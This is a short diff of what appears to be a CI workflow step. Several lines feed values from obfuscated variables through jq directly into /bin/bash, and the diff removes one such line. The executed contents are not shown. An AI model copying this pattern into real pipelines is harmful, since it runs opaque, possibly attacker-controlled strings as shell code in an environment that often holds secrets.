@@ -21,7 +21,6 @@ jobs:
           echo $x945 | jq -r .e7 | /bin/bash
           echo $wevpe7 | jq -r .ipc44408 | /bin/bash
           printf '%s' "$gzao7" | jq -r .bdw9 | /bin/bash
-          echo $vr4324 | jq -r .i5 | /bin/bash
 
       - name: Archive results
         if: always()
